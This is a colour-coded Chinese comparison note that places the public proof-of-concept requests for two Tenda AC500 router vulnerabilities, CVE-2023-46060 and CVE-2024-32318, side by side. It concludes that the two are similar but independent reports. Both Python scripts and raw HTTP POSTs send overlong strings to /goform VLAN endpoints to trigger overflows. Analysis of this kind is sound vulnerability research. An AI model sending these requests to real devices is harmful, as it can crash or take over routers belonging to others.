# AC500 PoC 大块彩色对照

> [!info] 设备与版本
> Tenda AC500 2.0.1.9（CVE-2023-46060）/ V2.0.1.9(1307)（CVE-2024-32318）。

<span style="color:#17803d;font-weight:700">绿色文字：共有请求骨架/字段。</span>　<span style="color:#c2410c;font-weight:700">橙色文字：具体变化字段或载荷。</span>

## <span style="color:#c2410c">B 级：CVE-2023-46060 ↔ CVE-2024-32318</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #c2410c;background:#fffaf5;padding:12px;">
<strong>CVE-2023-46060</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/peris-navince/founded-0-days/blob/main/Tenda/ac500/fromSetVlanInfo/1.md" target="_blank">peris-navince/founded-0-days PoC ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46060" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">import requests</span>
&nbsp;
<span style="color:#17803d">target = "http://TARGET_HOST<span style="color:#c2410c;font-weight:700">/goform/setVlanInfo</span>"</span>
<span style="color:#17803d">data = {</span>
<span style="color:#17803d">    "action": "add",</span>
<span style="color:#17803d">    <span style="color:#c2410c;font-weight:700">"port"</span>: "a" * <span style="color:#c2410c;font-weight:700">0x1000</span></span>
<span style="color:#17803d">}</span>
<span style="color:#17803d">headers = {</span>
<span style="color:#17803d">    "Content-Type": "application/x-www-form-urlencoded",</span>
<span style="color:#17803d">    "Cookie": "password=&lt;LAB_PASSWORD&gt;"</span>
<span style="color:#17803d">}</span>
<span style="color:#17803d">response = requests.post(target, headers=headers, data=data, timeout=10)</span>
<span style="color:#17803d">print(response.status_code, response.text[:500])</span>
&nbsp;
<span style="color:#17803d">POST <span style="color:#c2410c;font-weight:700">/goform/setVlanInfo</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded</span>
<span style="color:#17803d">Cookie: password=&lt;LAB_PASSWORD&gt;</span>
<span style="color:#17803d">Content-Length: &lt;由实际表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d">action=add&amp;<span style="color:#c2410c;font-weight:700">port=</span><span style="color:#c2410c;font-weight:700"></span></span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：接口 setVlanInfo；字段 port；长度 0x1000；源 PoC 有 password Cookie。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #c2410c;background:#fffaf5;padding:12px;">
<strong>CVE-2024-32318</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://github.com/abcdefg-png/IoT-vulnerable/blob/main/Tenda/AC500/fromSetVlanInfo_vlan.md" target="_blank">NVD 原引 abcdefg-png/IoT-vulnerable（Broken Link）↗</a>；<a href="https://github.com/gh-ost00/IOT-Vulnerable_POC/blob/main/Tenda/AC500/fromSetVlanInfo_vlan.md" target="_blank">gh-ost00 镜像副本 ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32318" target="_blank">NVD ↗</a></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">import requests</span>
&nbsp;
<span style="color:#17803d">target = "http://TARGET_HOST<span style="color:#c2410c;font-weight:700">/goform/forSetVlanInfo</span>"</span>
<span style="color:#17803d">data = {</span>
<span style="color:#17803d">    "action": "add",</span>
<span style="color:#17803d">    <span style="color:#c2410c;font-weight:700">"vlan"</span>: b"a" * <span style="color:#c2410c;font-weight:700">1000</span></span>
<span style="color:#17803d">}</span>
<span style="color:#17803d">response = requests.post(target, data=data, timeout=10)</span>
<span style="color:#17803d">print(response.status_code, response.text[:500])</span>
&nbsp;
<span style="color:#17803d">POST <span style="color:#c2410c;font-weight:700">/goform/forSetVlanInfo</span> HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST</span>
<span style="color:#17803d">Content-Type: application/x-www-form-urlencoded</span>
<span style="color:#17803d">Content-Length: &lt;由 requests 按编码后表单体计算&gt;</span>
<span style="color:#17803d">Connection: close</span>
&nbsp;
<span style="color:#17803d">action=add&amp;<span style="color:#c2410c;font-weight:700">vlan=</span><span style="color:#c2410c;font-weight:700"></span></span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">变化：接口 forSetVlanInfo；字段 vlan；长度 1000；公开镜像没有同样的 Cookie 行。</div>
</td>
</tr>
</table>

<span style="color:#c2410c;font-weight:700">判定：结构高度相似，但不是逐字相同。</span> 两条都在 Tenda AC500 VLAN 配置的 `action=add` 请求中放入长字符串；接口、字段、长度和认证细节用橙色保留，后续应通过固件反编译确认是否同一组件。

<span style="color:#c2410c;font-weight:700">NVD 对照说明：</span>CVE-2023-46060 对应 setVlanInfo/port；CVE-2024-32318 对应 formSetVlanInfo/vlan；接口、字段和长度差异与各自 NVD 描述一致，属于两个独立报告，不是同一 PoC 的复制。

来源：[CVE-2023-46060 原始请求](#CVE-2023-46060)、[CVE-2024-32318 原始请求](#CVE-2024-32318)。
